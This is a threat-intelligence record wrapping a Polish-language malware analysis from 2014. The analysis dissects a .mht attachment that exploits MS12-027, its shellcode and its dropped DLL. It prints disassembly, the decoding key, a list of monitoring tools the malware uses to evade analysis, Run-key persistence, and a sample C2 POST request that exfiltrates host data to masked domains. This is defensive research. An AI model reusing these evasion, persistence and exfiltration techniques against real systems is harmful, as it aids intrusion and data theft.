{
    "id": "45ef0a72-f7fc-4b40-b561-88182fb52a2b",
    "created_at": "2023-01-12T15:02:14.022634Z",
    "updated_at": "2025-03-27T02:06:10.00659Z",
    "deleted_at": null,
    "sha1_hash": "46466c7a79c75c6e2a69460d157e083d3a55993e",
    "title": "2014-08-11 - mht, MS12-27 and  malware  .info",
    "authors": "",
    "file_creation_date": "2022-05-28T17:44:39Z",
    "file_modification_date": "2022-05-28T17:44:39Z",
    "file_size": 180837,
    "plain_text": "# mht, MS12-27 oraz *malware*.info\n\n**malware.prevenity.com/2014/08/malware-info.html**\n\n_Przedstawiamy skrócony opis z analizy złośliwego oprogramowania rozsyłanego do instytucji_\n_rządowych. Plik załączany do wiadomości email miał rozszerzenie mht (MD5:_\n_D3DE5B8500453107D6D152B3C8506935)._\n\n_Poniżej fragment zawartości pliku. CLSID związany jest z błędem przepełnienia bufora w_\n_kontrolce ActiveX – MSCOMCTL.OCX (MS12-27)._\n\n_Wyodrębniony obiekt ocxstg001.mso po odkodowaniu base64 zawiera exploit:_\n\nW pliku mht można też zidentyfikować inny shellcode, którego celem jest między innymi\nzapisanie w TMP i uruchomienie kolejnej instancji WinWord.exe z nowym (podstawionym)\nplikiem - MH17.doc (treść dokumentu dotyczy katastrofy MH17) oraz wywołanie biblioteki\nDLL. Bibliotekę możemy również wyodrębnić samodzielnie z pliku mht.\n\n\n-----\n\nFragment drugiego shellcode:\n\nseg000:000001E9         cld\n\nseg000:000001EA         rep movsb\n\nseg000:000001EC         mov   [edx+0A4h], edi\n\nseg000:000001F2         mov   eax, [edx+20h]\n\nseg000:000001F5         push  0\n\nseg000:000001FA         push  0\n\nseg000:000001FF         push  2\n\nseg000:00000204         push  0\n\nseg000:00000209         push  0\n\nseg000:0000020E         push  4\n\nseg000:00000213         mov   ebx, [edx+8Ch]\n\nseg000:00000219         push  ebx\n\nseg000:0000021A         call  eax\n\nW efekcie po wykorzystaniu podatności na komputerze ofiary w katalogu TMP tworzone są\ndwa pliki:\n\nMH17.doc\nInstalator złośliwego oprogramowania (DLL) w.q – MD5:\n16A6C56BA458EC718B4E9BC8F9F10785\n\nBiblioteka DLL oprócz standardowej funkcji DllEntryPoint() eksportuje dwie dodatkowe\nfunkcje Start() oraz Start717(void*). Start717 na początku wykonuje sprawdzenia czy system\noperacyjny nie jest \"monitorowany\" i dopiero wtedy \"instaluje\" jedną z dwóch bibliotek\ngłównych.\n\nWiększość danych statycznych (komendy, nazwy funkcji, nazwy plików) w analizowanej\nbibliotece jest zakodowana.\n\n\n-----\n\nFragment kodu wywołujący funkcję odkodowującą dane poniżej:\n\n.text:70891190 sub_70891190 proc near    ; CODE XREF: Start717(void *)+59p\n\n.text:70891190 push  esi\n\n.text:70891191 push  edi\n\n.text:70891192 push  offset unk_7089B000       ; klucz\n\n.text:70891197 push  0\n\n.text:70891199 push  99h         ; ilość danych do odkodowania\n\n.text:7089119E push  offset LibFileName\n\n.text:708911A3 mov   esi, ecx\n\n.text:708911A5 call  odkoduj_1      ; odkoduj nazwy funkcji i bibliotek\n\n.text:708911AA push  offset unk_7089B000       ; klucz\n\n.text:708911AF push  0\n\n.text:708911B1 push  2E6h          ; ilość danych do odkodowania\n\n.text:708911B6 push  offset word_7089B0A8\n\n.text:708911BB call  odkoduj_1            ; odkoduj nazwy procesow\n\n.text:708911C0 mov   edi, ds:LoadLibraryA\n\n.text:708911C6 push  offset LibFileName       ; lpLibFileName\n\n.text:708911CB call  edi ; LoadLibraryA\n\n.text:708911CD push  offset aIboq4i         ; \"msvcrt.dll\"\n\n.text:708911D2 mov   [esi], eax\n\n.text:708911D4 call  edi ; LoadLibraryA\n\n\n-----\n\n.text:708911D6 mov   [esi+4], eax\n\n.text:708911D9 pop   edi\n\n.text:708911DA mov   eax, esi\n\n.text:708911DC pop   esi\n\n.text:708911DD retn\n\n.text:708911DD sub_70891190 endp\n\nPoniższy fragment kodu odpowiada za odkodowanie nazw bibliotek, funkcji i aplikacji\n\"monitorujących\". Użyty klucz FE95279A46B28136.\n.text:70891076 mov   dl, byte ptr [ebp+arg_4+3]\n\n.text:70891079\n\n.text:70891079 loc_70891079:          ; CODE XREF: sub_70891000+70j\n\n.text:70891079 add   dl, cl\n\n.text:7089107B lea   ebx, [edi+eax+2]\n\n.text:7089107F and   ebx, 7\n\n.text:70891082 xor   dl, [ebx+esi] ;pozycja w tablicy xor kolejny znak klucza\n\n.text:70891085 lea   ebx, [edi+eax+1]\n\n.text:70891089 and   ebx, 7\n\n.text:7089108C and   dl, [ebx+esi]\n\n.text:7089108F inc   ecx\n\n.text:70891090 mov   bl, dl\n\n.text:70891092 lea   edx, [esi+edi-1]\n\n.text:70891096 movzx  edx, byte ptr [edx+eax]\n\n\n-----\n\n.text:7089109A imul  edx, eax\n\n.text:7089109D add   edi, eax\n\n.text:7089109F shr   edx, 7\n\n.text:708910A2 and   edi, 7\n\n.text:708910A5 xor   dl, [edi+esi]\n\n.text:708910A8 mov   edi, [ebp+var_8]\n\n.text:708910AB add   bl, dl\n\n.text:708910AD mov   edx, [ebp+arg_0]\n\n.text:708910B0 xor   [edx+eax], bl            ;odkodowany znak\n\n.text:708910B3 inc   eax\n\n.text:708910B4 cmp   ecx, 8                   ;dł klucza\n\n.text:708910B7 jb   short loc_70891076\n\nOdkodowana pierwsza część danych:\n\nPoniżej lista aplikacji po wykryciu których malware kończy działanie:\n\nnetsniffer.exe\nwindump.exe\nwinapioverride32.exe\ntcpview.exe\nvboxservice.exe\nprocexp.exe\nwireshark.exe\nregmon.exe\nprocmon.exe\niris.exe\npetools.exe\nfilemon exe\n\n\n-----\n\nvboxtray.exe\ntcpdump.exe\napimonitor.exe\nodb.exe\napispy32.exe\ncomview.exe\nwinspy.exe\nvmtools.exe\nvmwaretray.exe\nimmunitydebugger.exe\nsyser.exe\ndumpcap.exe\nvmwareuser.exe\nollydbg.exe\nwindbg.exe\nidag.exe\n\nKolejna zastosowana metoda wykrywania debuggera polega na dwukrotnym wywołaniu\nfunkcji GetTickCount(). Jeśli różnica w zwracanej wartości jest zbyt duża – zwracana wartość\n1 powoduję wyłączenie malware.\n\n.text:70891394 mov   esi, eax\n\n.text:70891396 call  ebx               ; GetTickCount\n\n.text:70891398 push  eax\n\n.text:70891399 call  [ebp+var_4]           ; srand\n\n.text:7089139C add   esp, 4\n\n.text:7089139F call  esi               ; rand\n\n.text:708913A1 call  ebx               ; GetTickCount\n\n.text:708913A3 mov   [ebp+var_4], eax\n\n.text:708913A6 mov   edi, 186A0h\n\n.text:708913AB jmp   short loc_708913B0\n\n.text:708913B0 loc_708913B0:           ; CODE XREF: sub_70891360+4Bj\n\n\n-----\n\n.text:708913B0                     ; sub_70891360+55j\n\n.text:708913B0 call  esi               ; rand\n\n.text:708913B2 call  esi               ; rand\n\n.text:708913B4 dec   edi\n\n.text:708913B5 jnz   short loc_708913B0\n\n.text:708913B7 call  ebx               ; GetTickCount\n\n.text:708913B9 sub   eax, [ebp+var_4]\n\n.text:708913BC pop   edi\n\n.text:708913BD cmp   eax, 14h            ; porównaj rezultat\n\n.text:708913C0 sbb   eax, eax\n\nJeśli uruchomiony kod nie wykryje nic podejrzanego na stacji roboczej instalowane jest\nzłośliwe oprogramowanie:\n\nW katalogu C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Windows tworzy kolejny\nplik – coreshell.dll (MD5: 48656A93F9BA39410763A2196AABC67F)\n\nDo rejestrów dodawany jest klucz\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CoreShell z zawartością:\n“RUNDLL32.exe „C:\\Users\\\n<username>\\AppData\\Local\\Microsoft\\Windows\\coreshell.dll”,#1\n\nJeśli instalator ma uprawnienia lokalnego administratora to również utworzy:\nHKLM\\Software\\Classes\\CLSID\\{ EF7652A4-98EF-5031-226B-11456C96A7EA\n}\\INProcServer32 wskazując na coreshell.dll oraz funkcję Applicate()\n\nZłośliwe oprogramowanie ma zaimplementowany mechanizm zdalnego wykonywania\nkomend oraz pobierania i uruchamiania plików. Jednym z pierwszych czynności jest\npobranie z serwera C&C kolejnej biblioteki: advstoreshell.dll (MD5:\nD7A625779DF56D874871BB632F3E3106). Inny instalowany (dodawany do klucza RUN) na\nstacji roboczej plik to: conhost.dll (MD5: 5F69014A482DC115A93A80A486BB2842).\n\nDo serwerów C&C wysyłane są też informacje o zainfekowanym hoście (np. wynik\nsysteminfo) czy uruchomionych procesach. Zebranie informacje przed wysłaniem są\n\n\n-----\n\nszyfrowanie (wykonywany dwa razy XOR na różnych pozycjach klucza i indeksie tablicy z\ndanymi do zakodowania) oraz kodowane do base64. Klucz ma długość 6 bajtów.\n\nPróbka zebranych informacji:\n\n[System Process] ID:0 Path:00000057\n\nSystem ID:4 Path:00000005\n\nsmss.exe ID:272 Path:00000005\n\ncsrss.exe ID:364 Path:00000005\n\nwininit.exe ID:404 Path:00000005\n\ncsrss.exe ID:416 Path:00000005\n\nservices.exe ID:456 Path:00000005\n\nlsass.exe ID:496 Path:00000005\n\nlsm.exe ID:504 Path:00000005\n\nwinlogon.exe ID:512 Path:00000005\n\nsvchost.exe ID:632 Path:00000005\n\nsvchost.exe ID:696 Path:00000005\n\nsvchost.exe ID:744 Path:00000005\n\nsvchost.exe ID:832 Path:00000005\n\nsvchost.exe ID:904 Path:00000005\n\nsvchost.exe ID:1040 Path:00000005\n\nsvchost.exe ID:1124 Path:00000005\n\n\n-----\n\nspoolsv.exe ID:1304 Path:00000005\n\ndwm.exe ID:1328 Path:C:\\Windows\\system32\\Dwm.exe\n\nexplorer.exe ID:1352 Path:C:\\Windows\\Explorer.EXE\n\n…\n\nI ich zakodowana wersja:\n\nPOST /check/ HTTP/1.1\n\nUser-Agent: MSIE 8.0\n\nHost: malware*****.info\n\nContent-Length: 3408\n\nPragma: no-cache\n\nPmBn4Hb4AFtG5m/pFF4A7Uny/WJR43fbM0U/6WDEOVAKvLdUHlQiws1hQXdGyZlG\n\nQ3osvz0zdYZ1wjJAe3kDyCHNt2xmHuI1Qm8MJZM+JWsJG5wvCB5LHr0YLxFTJMcB\n\nASUH+r8qRBA9AeebBgNzB9iHfBdR+teMIgpaAO95KzX/Vx2GpDkJXWGTuDwAYy/4\n\nlC/vVh3k+CuWXGLV8C6yY3P+5jEEOVbnt9ROPA1Qq+CsMnhhgeO6OHJKdcaCPyEy\n\n3crElSPfz9WamErMu/jAnho50PyXlAM+rP/nmwArjfrPcWI70O71dCQkWuGbei0t\n\n…\n\nPrzy każdym zapytaniu POST wysyłanym do serwera C&C generowany jest nowy klucz\n„sesji” i dołączany do przesyłanej wiadomości.\n\n\n-----\n\nPrzesyłane wiadomości są oznaczane nagłówkami np. crtf (błędy), strtf (log) czy mtfs\n(informacje). Inne znaczniki wykorzystywane przez malware to ldrt, virt, crth, extc.\n\nNazwy funkcji i bibliotek w pamięci przechowywane są w formie zaszyfrowanej oraz w\nodwrotnej kolejności. Przed pobraniem adresu funkcji na krótko przywracana jest właściwa\nkolejność znaków aby następnie wywołać GetProcAddress().\n\nDane o większym rozmiarze są najpierw kompresowane za pomocą LZW a następnie\nszyfrowane algorytmem 3DES. Poniżej parametry wywołania funkcji CryptGenKey:\n\nOraz przykładowy klucz wykorzystany do szyfrowania przesyłanych plików. Pliki w formie\nzaszyfrowanej znajdują się w katalogu TMP (np. __2315tmp.dat) zainfekowanego\nużytkownika:\n\nMalware łączy się serwerem za pomocą http. Wykorzystuje ustawienia proxy. Poniżej lista\naktywnych serwerów:\n\n****malware.info\nmalware*****.info\n********-update.org\n****service24.net\n*******-update.com\n\n\n-----",
    "language": "PL",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2014/2014-08-11 - mht, MS12-27 and  malware  .info.pdf"
    ],
    "report_names": [
        "2014-08-11 - mht, MS12-27 and  malware  .info.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535734,
    "ts_updated_at": 1743041170,
    "ts_creation_date": 1653759879,
    "ts_modification_date": 1653759879,
    "files": {
        "pdf": "https://archive.orkl.eu/46466c7a79c75c6e2a69460d157e083d3a55993e.pdf",
        "text": "https://archive.orkl.eu/46466c7a79c75c6e2a69460d157e083d3a55993e.txt",
        "img": "https://archive.orkl.eu/46466c7a79c75c6e2a69460d157e083d3a55993e.jpg"
    }
}